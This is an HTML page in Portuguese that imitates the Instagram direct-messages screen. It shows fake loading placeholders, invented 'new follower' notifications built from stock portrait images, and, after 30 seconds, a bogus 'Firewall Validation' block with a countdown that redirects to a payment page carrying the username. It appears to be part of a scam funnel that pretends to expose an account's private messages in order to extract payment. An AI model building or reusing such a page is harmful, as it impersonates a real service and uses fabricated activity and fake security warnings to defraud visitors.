<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="css/main.css">
</head>
<body>
    <div class="e-con-inner">
        <div class="header e-flex">
            <div class="header-left">
                <i class="fas fa-arrow-left"></i>
                <span id="username-display" class="username"></span>
                <i class="fas fa-chevron-down"></i>
            </div>
            <div class="header-right">
                <img src="../media/icons_header.jpg" alt="icons">
            </div>
        </div>

        <div class="search-bar-container">
            <img src="../media/search_bar.jpg" alt="search bar">
        </div>

        <div class="notes-container e-flex">
            <!-- Item do Usuário com a classe de correção -->
            <div class="note-item is-user">
                <div class="note-balloon-wrapper">
                    <img src="../media/bg_note.png" class="note-balloon" alt="note">
                </div>
                <div class="note-circle-wrapper">
                    <div class="note-circle loading-shimmer"></div>
                </div>
                <span class="note-text">Sua nota</span>
            </div>

            <!-- Outros Itens (estrutura idêntica) -->
            <div class="note-item">
                <div class="note-balloon-wrapper">
                    <img src="../media/bg_note.png" class="note-balloon" alt="note">
                </div>
                <div class="note-circle-wrapper">
                    <div class="note-circle loading-shimmer"></div>
                </div>
                <div class="note-label loading-shimmer"></div>
            </div>
            <div class="note-item">
                <div class="note-balloon-wrapper">
                    <img src="../media/bg_note.png" class="note-balloon" alt="note">
                </div>
                <div class="note-circle-wrapper">
                    <div class="note-circle loading-shimmer"></div>
                </div>
                <div class="note-label loading-shimmer"></div>
            </div>
            <div class="note-item">
                <div class="note-balloon-wrapper">
                    <img src="../media/bg_note.png" class="note-balloon" alt="note">
                </div>
                <div class="note-circle-wrapper">
                    <div class="note-circle loading-shimmer"></div>
                </div>
                <div class="note-label loading-shimmer"></div>
            </div>
        </div>

        <div class="tabs-container e-flex">
            <div class="tab active"><i class="fas fa-circle"></i>Principal</div>
            <div class="tab">Geral</div>
            <div class="tab">Canais</div>
            <div class="tab">Solicitações</div>
        </div>

        <div class="messages-list">
            <div class="message-item">
                <div class="message-avatar-container"><div class="message-avatar loading-shimmer"></div></div>
                <div class="message-details">
                    <div class="message-line loading-shimmer"></div>
                    <div class="message-line short loading-shimmer"></div>
                </div>
                <div class="message-cam-wrapper notify"><img src="../media/cam_icon.jpg" class="message-cam-icon"></div>
            </div>
            <div class="message-item">
                <div class="message-avatar-container"><div class="message-avatar loading-shimmer"></div></div>
                <div class="message-details">
                    <div class="message-line loading-shimmer"></div>
                    <div class="message-line short loading-shimmer"></div>
                </div>
                <div class="message-cam-wrapper"><img src="../media/cam_icon.jpg" class="message-cam-icon"></div>
            </div>
            <div class="message-item">
                <div class="message-avatar-container"><div class="message-avatar loading-shimmer"></div></div>
                <div class="message-details">
                    <div class="message-line loading-shimmer"></div>
                    <div class="message-line short loading-shimmer"></div>
                </div>
                <div class="message-cam-wrapper"><img src="../media/cam_icon.jpg" class="message-cam-icon"></div>
            </div>
        </div>

        <div class="loading-more">
            <span>Acessando mais mensagens...</span>
            <div class="spinner"></div>
        </div>
    </div>

    <div id="firewall-overlay">
        <h2><i class="fas fa-shield-alt"></i> Firewall Validation</h2>
        <p>Acesso bloqueado. Redirecionando em <span id="countdown">10</span>s...</p>
    </div>

    <div id="follower-notification"></div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const username = urlParams.get('username') || 'joao';
        document.getElementById('username-display').textContent = username;

        setTimeout(() => {
            const shimmerElements = document.querySelectorAll('.loading-shimmer');
            shimmerElements.forEach(el => el.classList.remove('loading-shimmer'));
        }, 4000);

        const notification = document.getElementById('follower-notification');
        function showNotification(index) {
            notification.innerHTML = `<img src="https://randomuser.me/api/portraits/men/${index+30}.jpg" alt="follower"> <b>Seguidor ${index+1}</b> começou a seguir você.`;
            notification.style.bottom = '20px';
            setTimeout(() => { notification.style.bottom = '-100px'; }, 3500);
        }
        setTimeout(() => showNotification(0), 6000);
        setTimeout(() => showNotification(1), 11000);

        setTimeout(() => {
            const firewallOverlay = document.getElementById('firewall-overlay');
            firewallOverlay.style.display = 'flex';
            let countdownValue = 10;
            const countdownElement = document.getElementById('countdown');
            const countdownInterval = setInterval(() => {
                countdownValue--;
                countdownElement.textContent = countdownValue + 's...';
                if (countdownValue <= 0) {
                    clearInterval(countdownInterval);
                    window.location.href = `../payment-account/?username=${username}`;
                }
            }, 1000);
        }, 30000);
    </script>
</body>
</html>
